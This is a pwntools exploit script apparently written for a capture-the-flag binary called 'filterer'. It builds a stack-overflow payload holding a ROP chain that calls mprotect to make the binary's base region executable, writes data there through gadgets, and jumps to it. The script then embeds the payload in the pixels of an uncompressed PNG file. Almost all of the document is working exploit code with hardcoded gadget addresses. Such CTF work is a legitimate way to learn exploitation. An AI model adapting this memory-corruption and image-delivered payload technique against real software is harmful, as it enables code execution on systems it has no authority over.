#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./filterer
from pwn import *
from PIL import Image
import random
# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    """Start the exploit against the target."""
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = """
tbreak main
continue
""".format(**locals())

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
# Arch:     amd64-64-little
# RELRO:      Partial RELRO
# Stack:      Canary found
# NX:         NX enabled
# PIE:        No PIE (0x400000)
# Stripped:   No
# Debuginfo:  Yes

# io = start()


def set_number(pay, num, index, bytex):
    kekx = b""
    for i in range(bytex):
        kekx += ((num >> (8 * i)) & 0xFF).to_bytes(1, "little")
    print(kekx)
    pay2 = pay[:index] + kekx + pay[index + bytex :]
    return pay2


payload = b"\x00" * 4194900
ret_addr_index = 4194304 + 9 * 8

pop_rdi_pop_rbp = 0x0000000000403015

pop_rsi_pop_rbp = 0x0000000000425A2B

pop_rax = 0x0000000000402324

pop_r8 = 0x00000000005690BB

syscall = 0x00000000560C40

call_rsp = 0x0000000000527509

pop_rdx_r12_rbp = 0x00000000004F4C44

memcpy = 0x0000000052EE20

call_rax = 0x000000000042AFBF

mov_qword_r8_rsi = 0x000000000059FCA7

pop_rcx = 0x0000000000530823

# mprotect binary base to rwx (0x400000 addr)

payload = set_number(payload, pop_rdx_r12_rbp, 4194304 + 8 * 9, 8)
payload = set_number(payload, 0x1000, 4194304 + 8 * 10, 8)
payload = set_number(payload, 0, 4194304 + 8 * 11, 8)
payload = set_number(payload, 0, 4194304 + 8 * 12, 8)

payload = set_number(payload, pop_rdi_pop_rbp, 4194304 + 8 * 13, 8)
payload = set_number(payload, 0xA, 4194304 + 8 * 14, 8)
payload = set_number(payload, 0x0, 4194304 + 8 * 15, 8)


payload = set_number(payload, pop_rsi_pop_rbp, 4194304 + 8 * 16, 8)
payload = set_number(payload, 0x400000, 4194304 + 8 * 17, 8)
payload = set_number(payload, 0, 4194304 + 8 * 18, 8)

payload = set_number(payload, pop_rcx, 4194304 + 8 * 19, 8)
payload = set_number(payload, 0x7, 4194304 + 8 * 20, 8)


payload = set_number(payload, syscall, 4194304 + 8 * 21, 8)


# write shellcode in rwx via gadjet (0x400000 addr)

payload = set_number(payload, pop_rsi_pop_rbp, 4194304 + 8 * 22, 8)
payload = set_number(payload, 0x13371337, 4194304 + 8 * 23, 8)
payload = set_number(payload, 0x0, 4194304 + 8 * 24, 8)
payload = set_number(payload, pop_r8, 4194304 + 8 * 25, 8)
payload = set_number(payload, 0x400000, 4194304 + 8 * 26, 8)
payload = set_number(payload, mov_qword_r8_rsi, 4194304 + 8 * 27, 8)

# return to sprayed shellcode
payload = set_number(payload, 0x400000, 4194304 + 8 * 28, 8)

print(payload[4194304 + 9 * 8])

# print(payload)

im = Image.new("RGB", (4194900 // 3, 1))

# pix = im.load()

for i in range((4194304 + 9 * 8) // 3, 4194900 // 3):
    for j in range(1):
        im.putpixel((i, j), (payload[i * 3], payload[i * 3 + 1], payload[i * 3 + 2]))
        print(payload[i * 3])

im.save("exploit.png", compress_level=0)

# io.interactive()
